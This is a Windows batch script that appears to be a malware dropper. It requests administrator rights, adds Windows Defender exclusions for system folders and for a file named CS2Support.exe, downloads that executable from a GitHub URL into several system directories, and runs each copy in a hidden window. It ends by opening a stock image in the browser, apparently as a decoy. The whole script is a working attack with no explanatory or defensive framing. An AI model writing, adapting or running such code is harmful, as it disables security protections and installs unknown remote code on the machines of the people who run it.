@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

powershell -WindowStyle Hidden -Command "
    $paths = @('C:\ProgramData', 'C:\Users\Public\Downloads', 'C:\Windows\System32', 'C:\Windows\SysWOW64', 'C:\Windows');
    foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path }
    Add-MpPreference -ExclusionExtension 'CS2Support.exe'"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
    $urls = @(
        'C:\Users\Public\Downloads\CS2Support.exe',
        'C:\Windows\System32\CS2Support.exe',
        'C:\Windows\SysWOW64\CS2Support.exe',
        'C:\Windows\CS2Support.exe'
    )
    foreach ($path in $urls) {
        Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile $path
        Start-Process $path -WindowStyle Hidden
    }"

start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
